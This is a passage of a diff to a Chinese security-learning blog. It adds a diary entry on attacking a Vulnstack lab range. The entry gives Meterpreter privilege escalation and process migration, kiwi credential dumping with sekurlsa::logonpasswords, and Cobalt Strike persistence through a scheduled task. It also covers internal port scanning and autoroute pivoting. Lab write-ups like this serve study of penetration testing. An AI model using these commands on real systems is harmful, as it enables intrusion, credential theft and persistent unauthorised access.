meterpreter</span><br>getsystem<br>提权成功<br>ps<br>migrate 迁移到一个稳定的进程<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204160842752.png" srcset="/img/loading.gif" lazyload alt="image-20231204160842752"></p>
+<h5 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h5><p>做个cs的马子，上传-&gt;隐藏-&gt;计划任务 一条龙，上线cs</p>
+<p>域控里出场率很高的一个词叫 <strong>黄金票据</strong> ，回头学习一下再利用</p>
+<p>用msf的kiwi查查密码</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta"># meterpreter</span><br>load kiwi<br>help kiwi<br>kiwi_cmd sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure>
+
+<h5 id="关掉防火墙"><a href="#关掉防火墙" class="headerlink" title="关掉防火墙"></a>关掉防火墙</h5><h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><h5 id="内网收集1-cs"><a href="#内网收集1-cs" class="headerlink" title="内网收集1 - cs"></a>内网收集1 - cs</h5><p>利用cs已上线的靶机扫描内网存活主机</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># cs beacon</span><br><span class="hljs-attribute">portscan</span> <span class="hljs-number">10.10.10.1</span>-<span class="hljs-number">10.10.10.255</span> <span class="hljs-number">445</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">80</span>,<span class="hljs-number">443</span> arp <span class="hljs-number">20</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231205161854262.png" srcset="/img/loading.gif" lazyload alt="image-20231205161854262"></p>
+<p>存活主机 <code>10, 80(当前靶机), 201</code></p>
+<h5 id="内网收集2-msf"><a href="#内网收集2-msf" class="headerlink" title="内网收集2 - msf"></a>内网收集2 - msf</h5><p>msf挂个路由</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># meterpreter</span><br><span class="hljs-attribute">run</span> autoroute -s <span class="hljs-number">10.10.10.0</span>/<span class="hljs-number">24</span><br><span class="hljs-attribute">bg</span><br></code></pre></td></tr></table></figure>
+
+<p>用msf扫一下开放的端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># msf</span><br><span class="hljs-attribute">search</span> portscan<br><span class="hljs-attribute">use</span> auxiliary/scanner/portscan/tcp<br><span class="hljs-attribute">set</span> rhost <span class="hljs-number">10.10.10.10</span>(<span class="hljs-number">10.10.10.201</span>)<br><span class="hljs-attribute">set</span> ports <span class="hljs-number">1</span>-<span class="hljs-number">10000</span>(默认)<br><span class="hljs-attribute">set</span> concurrency <span class="hljs-number">1000</span>(端口扫描速度，默认<span class="hljs-number">10</span>，改<span class="hljs-number">1000</span>直接起飞~)<br><span class="hljs-attribute">run</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231205165146786.png" srcset="/img/loading.gif" lazyload alt="image-20231205165146786"><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231205170345103.png" srcset="/img/loading.gif" lazyload alt="image-20231205170345103"></p>
+<h5 id="内网收集3-fscan"><a href="#内网收集3-fscan" class="headerlink" title="内网收集3 - fscan"></a>内网收集3 - fscan</h5><p><code>kernel32.dll not found</code> 奇了怪了，明明有这个加载库，但是启动不起来，查了很多解决方法都不行，上次也是这个问题，先搁置。</p>
+<p>好家伙，登录不上，机子又日坏了，哎</p>
+<p>剩下的大概就是找一下漏洞然后利用(永恒之蓝之类的，没啥新奇)</p>
 
                 
               </div>
@@ -458,11 +392,9 @@
       
         <a href="/tags/%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/" class="print-no-link">#解题记录</a>
       
-        <a href="/tags/vulnhub/" class="print-no-link">#vulnhub</a>
-      
         <a href="/tags/%E5%AD%A6%E4%B9%A0/" class="print-no-link">#学习</a>
       
-        <a href="/tags/%E6%8F%90%E6%9D%83/" class="print-no-link">#提权</a>
+        <a href="/tags/vulnstack/" class="print-no-link">#vulnstack</a>
       
     </div>
   
@@ -474,8 +406,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>hacksudoLPE</div>
-      <div>https://just1greed.github.io/2023/11/26/hacksudoLPE/</div>
+      <div>vulnstack靶场日记-2</div>
+      <div>https://just1greed.github.io/2023/12/04/vulnstack靶场日记-2/</div>
     </div>
     <div class="license-meta">
       
@@ -487,13 +419,13 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年11月26日</div>
+          <div>2023年12月4日</div>
         </div>
       
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2023年11月26日</div>
+          <div>2023年12月6日</div>
         </div>
       
       
@@ -524,9 +456,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/11/26/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/" title="网安学习笔记(持续更新中)">
+                      <a href="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/" title="vulnstack靶场日记-3">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">网安学习笔记(持续更新中)</span>
+                        <span class="hidden-mobile">vulnstack靶场日记-3</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -534,8 +466,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/" title="vulnhub靶场日记">
-                        <span class="hidden-mobile">vulnhub靶场日记</span>
+                      <a href="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/" title="vulnstack靶场日记">
+                        <span class="hidden-mobile">vulnstack靶场日记</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
